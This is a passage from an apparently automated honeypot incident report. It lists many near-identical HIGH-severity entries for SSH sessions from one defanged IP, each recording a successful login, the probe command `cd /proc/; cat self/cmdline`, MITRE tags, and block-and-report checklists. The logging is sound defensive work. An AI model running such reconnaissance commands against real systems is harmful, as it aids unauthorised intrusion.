- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-febd0a2ac216

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:56 |
| **Last Seen** | 2026-07-13 11:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:56:12` | `cowrie.session.connect` |
| `2026-07-13 11:56:12` | `cowrie.login.success` |
| `2026-07-13 11:56:13` | `cowrie.session.params` |
| `2026-07-13 11:56:13` | `cowrie.command.input` |
| `2026-07-13 11:56:22` | `cowrie.log.closed` |
| `2026-07-13 11:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-839ec5b5a156

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:56 |
| **Last Seen** | 2026-07-13 11:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:56:22` | `cowrie.session.connect` |
| `2026-07-13 11:56:22` | `cowrie.login.success` |
| `2026-07-13 11:56:23` | `cowrie.session.params` |
| `2026-07-13 11:56:23` | `cowrie.command.input` |
| `2026-07-13 11:56:32` | `cowrie.log.closed` |
| `2026-07-13 11:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5abf69e80a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:56 |
| **Last Seen** | 2026-07-13 11:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:56:32` | `cowrie.session.connect` |
| `2026-07-13 11:56:32` | `cowrie.login.success` |
| `2026-07-13 11:56:33` | `cowrie.session.params` |
| `2026-07-13 11:56:33` | `cowrie.command.input` |
| `2026-07-13 11:56:42` | `cowrie.log.closed` |
| `2026-07-13 11:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8547c2330f7a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:56 |
| **Last Seen** | 2026-07-13 11:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:56:42` | `cowrie.session.connect` |
| `2026-07-13 11:56:43` | `cowrie.login.success` |
| `2026-07-13 11:56:43` | `cowrie.session.params` |
| `2026-07-13 11:56:43` | `cowrie.command.input` |
| `2026-07-13 11:56:52` | `cowrie.log.closed` |
| `2026-07-13 11:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94e811676b7

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:56 |
| **Last Seen** | 2026-07-13 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:56:52` | `cowrie.session.connect` |
| `2026-07-13 11:56:53` | `cowrie.login.success` |
| `2026-07-13 11:56:53` | `cowrie.session.params` |
| `2026-07-13 11:56:54` | `cowrie.command.input` |
| `2026-07-13 11:57:02` | `cowrie.log.closed` |
| `2026-07-13 11:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc42c151aeb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:57 |
| **Last Seen** | 2026-07-13 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:57:03` | `cowrie.session.connect` |
| `2026-07-13 11:57:03` | `cowrie.login.success` |
| `2026-07-13 11:57:03` | `cowrie.session.params` |
| `2026-07-13 11:57:04` | `cowrie.command.input` |
| `2026-07-13 11:57:13` | `cowrie.log.closed` |
| `2026-07-13 11:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3155136ab1b1

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:57 |
| **Last Seen** | 2026-07-13 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:57:13` | `cowrie.session.connect` |
| `2026-07-13 11:57:13` | `cowrie.login.success` |
| `2026-07-13 11:57:14` | `cowrie.session.params` |
| `2026-07-13 11:57:14` | `cowrie.command.input` |
| `2026-07-13 11:57:23` | `cowrie.log.closed` |
| `2026-07-13 11:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8962ea9dfa10

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:57 |
| **Last Seen** | 2026-07-13 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:57:23` | `cowrie.session.connect` |
| `2026-07-13 11:57:23` | `cowrie.login.success` |
| `2026-07-13 11:57:24` | `cowrie.session.params` |
| `2026-07-13 11:57:24` | `cowrie.command.input` |
| `2026-07-13 11:57:33` | `cowrie.log.closed` |
| `2026-07-13 11:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642299e83164

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:57 |
| **Last Seen** | 2026-07-13 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:57:33` | `cowrie.session.connect` |
| `2026-07-13 11:57:33` | `cowrie.login.success` |
| `2026-07-13 11:57:34` | `cowrie.session.params` |
| `2026-07-13 11:57:34` | `cowrie.command.input` |
| `2026-07-13 11:57:43` | `cowrie.log.closed` |
| `2026-07-13 11:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3798a3d21a59

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:57 |
| **Last Seen** | 2026-07-13 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:57:43` | `cowrie.session.connect` |
| `2026-07-13 11:57:43` | `cowrie.login.success` |
| `2026-07-13 11:57:44` | `cowrie.session.params` |
| `2026-07-13 11:57:44` | `cowrie.command.input` |
| `2026-07-13 11:57:53` | `cowrie.log.closed` |
| `2026-07-13 11:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe4839874cb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:57 |
| **Last Seen** | 2026-07-13 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:57:53` | `cowrie.session.connect` |
| `2026-07-13 11:57:54` | `cowrie.login.success` |
| `2026-07-13 11:57:54` | `cowrie.session.params` |
| `2026-07-13 11:57:54` | `cowrie.command.input` |
| `2026-07-13 11:58:03` | `cowrie.log.closed` |
| `2026-07-13 11:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9021238339

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:58 |
| **Last Seen** | 2026-07-13 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:58:03` | `cowrie.session.connect` |
| `2026-07-13 11:58:04` | `cowrie.login.success` |
| `2026-07-13 11:58:04` | `cowrie.session.params` |
| `2026-07-13 11:58:04` | `cowrie.command.input` |
| `2026-07-13 11:58:13` | `cowrie.log.closed` |
| `2026-07-13 11:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9eb040cb92

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:58 |
| **Last Seen** | 2026-07-13 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:58:13` | `cowrie.session.connect` |
| `2026-07-13 11:58:14` | `cowrie.login.success` |
| `2026-07-13 11:58:14` | `cowrie.session.params` |
| `2026-07-13 11:58:14` | `cowrie.command.input` |
| `2026-07-13 11:58:23` | `cowrie.log.closed` |
| `2026-07-13 11:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b119ec9458

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:58 |
| **Last Seen** | 2026-07-13 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:58:23` | `cowrie.session.connect` |
| `2026-07-13 11:58:24` | `cowrie.login.success` |
| `2026-07-13 11:58:24` | `cowrie.session.params` |
| `2026-07-13 11:58:24` | `cowrie.command.input` |
| `2026-07-13 11:58:33` | `cowrie.log.closed` |
| `2026-07-13 11:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f9e125c7a2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:58 |
| **Last Seen** | 2026-07-13 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:58:34` | `cowrie.session.connect` |
| `2026-07-13 11:58:34` | `cowrie.login.success` |
| `2026-07-13 11:58:34` | `cowrie.session.params` |
| `2026-07-13 11:58:35` | `cowrie.command.input` |
| `2026-07-13 11:58:44` | `cowrie.log.closed` |
| `2026-07-13 11:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f96a0679fd8

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:58 |
| **Last Seen** | 2026-07-13 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:58:44` | `cowrie.session.connect` |
| `2026-07-13 11:58:44` | `cowrie.login.success` |
| `2026-07-13 11:58:44` | `cowrie.session.params` |
| `2026-07-13 11:58:45` | `cowrie.command.input` |
| `2026-07-13 11:58:54` | `cowrie.log.closed` |
| `2026-07-13 11:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24627f17f7dc

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:58 |
| **Last Seen** | 2026-07-13 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:58:54` | `cowrie.session.connect` |
| `2026-07-13 11:58:54` | `cowrie.login.success` |
| `2026-07-13 11:58:55` | `cowrie.session.params` |
| `2026-07-13 11:58:55` | `cowrie.command.input` |
| `2026-07-13 11:59:04` | `cowrie.log.closed` |
| `2026-07-13 11:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5298a9ef66

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:59 |
| **Last Seen** | 2026-07-13 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:59:04` | `cowrie.session.connect` |
| `2026-07-13 11:59:04` | `cowrie.login.success` |
| `2026-07-13 11:59:05` | `cowrie.session.params` |
| `2026-07-13 11:59:05` | `cowrie.command.input` |
| `2026-07-13 11:59:14` | `cowrie.log.closed` |
| `2026-07-13 11:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f0c69765e2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:59 |
| **Last Seen** | 2026-07-13 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:59:14` | `cowrie.session.connect` |
| `2026-07-13 11:59:14` | `cowrie.login.success` |
| `2026-07-13 11:59:15` | `cowrie.session.params` |
| `2026-07-13 11:59:15` | `cowrie.command.input` |
| `2026-07-13 11:59:24` | `cowrie.log.closed` |
| `2026-07-13 11:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56079402fb02

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:59 |
| **Last Seen** | 2026-07-13 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:59:24` | `cowrie.session.connect` |
| `2026-07-13 11:59:24` | `cowrie.login.success` |
| `2026-07-13 11:59:25` | `cowrie.session.params` |
| `2026-07-13 11:59:25` | `cowrie.command.input` |
| `2026-07-13 11:59:34` | `cowrie.log.closed` |
| `2026-07-13 11:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e5f90eb068

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:59 |
| **Last Seen** | 2026-07-13 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:59:34` | `cowrie.session.connect` |
| `2026-07-13 11:59:34` | `cowrie.login.success` |
| `2026-07-13 11:59:35` | `cowrie.session.params` |
| `2026-07-13 11:59:35` | `cowrie.command.input` |
| `2026-07-13 11:59:44` | `cowrie.log.closed` |
| `2026-07-13 11:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc3aa20990f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:59 |
| **Last Seen** | 2026-07-13 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:59:44` | `cowrie.session.connect` |
| `2026-07-13 11:59:45` | `cowrie.login.success` |
| `2026-07-13 11:59:45` | `cowrie.session.params` |
| `2026-07-13 11:59:45` | `cowrie.command.input` |
| `2026-07-13 11:59:54` | `cowrie.log.closed` |
| `2026-07-13 11:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b3007378d0a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:59 |
| **Last Seen** | 2026-07-13 12:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:59:55` | `cowrie.session.connect` |
| `2026-07-13 11:59:55` | `cowrie.login.success` |
| `2026-07-13 11:59:55` | `cowrie.session.params` |
| `2026-07-13 11:59:55` | `cowrie.command.input` |
| `2026-07-13 12:00:05` | `cowrie.log.closed` |
| `2026-07-13 12:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d94afeaf1e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:00 |
| **Last Seen** | 2026-07-13 12:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:00:05` | `cowrie.session.connect` |
| `2026-07-13 12:00:05` | `cowrie.login.success` |
| `2026-07-13 12:00:05` | `cowrie.session.params` |
| `2026-07-13 12:00:06` | `cowrie.command.input` |
| `2026-07-13 12:00:15` | `cowrie.log.closed` |
| `2026-07-13 12:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf6c29ab529

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:00 |
| **Last Seen** | 2026-07-13 12:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:00:15` | `cowrie.session.connect` |
| `2026-07-13 12:00:15` | `cowrie.login.success` |
| `2026-07-13 12:00:16` | `cowrie.session.params` |
| `2026-07-13 12:00:16` | `cowrie.command.input` |
| `2026-07-13 12:00:25` | `cowrie.log.closed` |
| `2026-07-13 12:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e63fbd1caf9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:00 |
| **Last Seen** | 2026-07-13 12:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:00:25` | `cowrie.session.connect` |
| `2026-07-13 12:00:25` | `cowrie.login.success` |
| `2026-07-13 12:00:26` | `cowrie.session.params` |
| `2026-07-13 12:00:26` | `cowrie.command.input` |
| `2026-07-13 12:00:35` | `cowrie.log.closed` |
| `2026-07-13 12:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01aee2af4c67

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:00 |
| **Last Seen** | 2026-07-13 12:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:00:35` | `cowrie.session.connect` |
| `2026-07-13 12:00:36` | `cowrie.login.success` |
| `2026-07-13 12:00:36` | `cowrie.session.params` |
| `2026-07-13 12:00:36` | `cowrie.command.input` |
| `2026-07-13 12:00:46` | `cowrie.log.closed` |
| `2026-07-13 12:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0dce82f0133

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:00 |
| **Last Seen** | 2026-07-13 12:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:00:46` | `cowrie.session.connect` |
| `2026-07-13 12:00:46` | `cowrie.login.success` |
| `2026-07-13 12:00:46` | `cowrie.session.params` |
| `2026-07-13 12:00:46` | `cowrie.command.input` |
| `2026-07-13 12:00:56` | `cowrie.log.closed` |
| `2026-07-13 12:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f1cc1fc7e4f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
